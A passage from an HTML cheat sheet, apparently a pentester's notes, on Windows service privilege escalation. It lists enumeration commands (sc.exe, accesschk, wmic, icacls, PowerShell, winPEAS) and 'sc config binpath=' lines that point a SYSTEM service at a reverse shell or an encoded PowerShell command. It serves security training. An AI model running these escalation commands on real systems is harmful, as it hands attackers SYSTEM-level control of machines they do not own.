                <li>ConvertFrom-SddlString -Sddl $acl.Sddl -type RegistryRights | ForEach-Object {$_.DiscretionaryAcl}</li>
            </td>
        </tr>
        <tr>
            <td>List services</td>
            <td>gci HKLM:\SYSTEM\CurrentControlSet\Services</td>
        </tr>
        <tr>
            <td>
                <li>List services:</li>
                <ul>
                    <li>Running as: SYSTEM</li>
                    <li>Start/stop type: manual</li>
                </ul>
            </td>
            <td>
                <table>
                    <tr>
                        <td>Create list of all services</td>
                        <td>$services = Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\*</td>
                    </tr>
                    <tr>
                        <td>Show all services owened by SYSTEM and start type is manual</td>
                        <td>$services | where { ($_.ObjectName -match 'LocalSystem') -and ($_.Start -match '3') }</td>
                    </tr>
                    <tr>
                        <td>Get list of services with only name, no details</td>
                        <td>$names = $services.pschildname</td>
                    </tr>
                    <tr>
                        <td>List all services owened by SYSTEM, start type manual, and we have permission to start</td>
                        <td>$canStart = Foreach ($service in $names) { $sddl = (cmd /c sc sdshow $service); if ($sddl -match "RP[A-Z]*?;;;AU") { $service }}</td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td>List permissions for a service</td>
            <td>
                <li>sc.exe sdshow &lt;service&gt;</li>
                <li>ConvertFrom-SDDLString -Sddl &quot;&lt;output from sc.exe sdshow &lt;service&gt;&gt;&quot; | ForEach-Object {$_.DiscretionaryAcl}</li>
                <li>How to read the permissions: https://dimitri.janczak.net/2018/06/01/start-stop-service-rights-to-non-administrators/</li>
            </td>
        </tr>
    </table>
    <li>Tools</li>
    <ul>
        <li>winPEAS</li>
        <table>
            <tr>
                <td>Check for service vulnerabilities</td>
                <td>winPEASany.exe quiet servicesinfo</td>
            </tr>
        </table>
        <li>sc.exe</li>
        <table>
            <tr>
                <td>Start/Stop a service</td>
                <td>sc.exe start/stop &lt;service name&gt;</td>
            </tr>
            <tr>
                <td>Query the configuration of a service</td>
                <td>sc.exe qc &lt;name&gt;</td>
            </tr>
            <tr>
                <td>Query the current status of a service</td>
                <td>sc.exe query &lt;name&gt;</td>
            </tr>
            <tr>
                <td>Modify a configuration option of a service</td>
                <td>sc.exe config &lt;name&gt; &lt;option&gt;= &lt;value&gt;</td>
            </tr>
            <tr>
                <td>Change service start type</td>
                <td>sc config &lt;Service Name&gt; start= auto</td>
            </tr>
            <tr>
                <td>Change binary path</td>
                <td>sc config &lt;name&gt; binpath= "\"C:\path\to\reverse_shell\""</td>
            </tr>
        </table>
        <li>accesschk.exe</li>
        <table>
            <tr>
                <td>Check for services we have rights/privileges to</td>
                <td>accesschk.exe /accepteula -uwcqv "Authenticated Users" *</td>
            </tr>
            <tr>
                <td>More details on user groups rights/privileges to a service</td>
                <td>accesschk.exe /accepteula -ucqv &lt;Service Name&gt;</td>
            </tr>
            <tr>
                <td>verify user permissions to a service</td>
                <td>accesschk.exe /accepteula -ucqv &lt;username&gt; &lt;service&gt;</td>
            </tr>
            <tr>
                <td>Check for permissions to write in a directory</td>
                <td>accesschk.exe /accepteula -uwdq C:\directory</td>
            </tr>
            <tr>
                <td>Check for access to insecure executables</td>
                <td>accesschk.exe /accepteula -quvw &lt;Executable&gt;</td>
            </tr>
        </table>
        <li>net</li>
        <table>
            <tr>
                <td>Start/Stop a service</td>
                <td>net start/stop &lt;name&gt;</td>
            </tr>
        </table>
        <li>wmic</li>
        <table>
            <tr>
                <td>Check service start options</td>
                <td>wmic service where caption=&quot;&lt;ServiceName&gt;&quot; get name, caption, state, startmode</td>
            </tr>
            <tr>
                <td>Check running services</td>
                <td>wmic service get name,displayname,pathname,startmode</td>
            </tr>
            <tr>
                <td>Get running services that are auto and not standard windows</td>
                <td>wmic service get name,displayname,pathname,startmode |findstr /i "auto"|findstr /i /v "c:\windows"</td>
            </tr>
        </table>
        <li>powershell</li>
        <table>
            <tr>
                <td>List running services</td>
                <td>Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}</td>
            </tr>
            <tr>
                <td>Start service</td>
                <td>Start-Service &lt;service&gt;</td>
            </tr>
        </table>
        <li>cmd</li>
        <table>
            <tr>
                <td>List running services</td>
                <td>tasklist</td>
            </tr>
        </table>
        <li>icacls</li>
        <table>
            <tr>
                <td>Check directory permissions</td>
                <td>icacls "C:\&lt;Directory&gt;"</td>
            </tr>
            <tr>
                <td>Check for access to insecure executable</td>
                <td>Icacls &quot;&lt;Executable&gt;&quot;</td>
            </tr>
        </table>
    </ul>
    <li>Insecure Service Properties</li>
    <ul>
        <li>Change binary path</li>
        <ul>
            <li>sc config &lt;name&gt; binpath= &quot;\&quot;C:\reverse_shell.exe""</li>
            <li>sc.exe config usosvc binpath="cmd.exe /c powershell.exe -EncodedCommand &lt;base64&gt;</li>
        </ul>
    </ul>
    <li>Unquoted Service Path</li>












</body>
</html>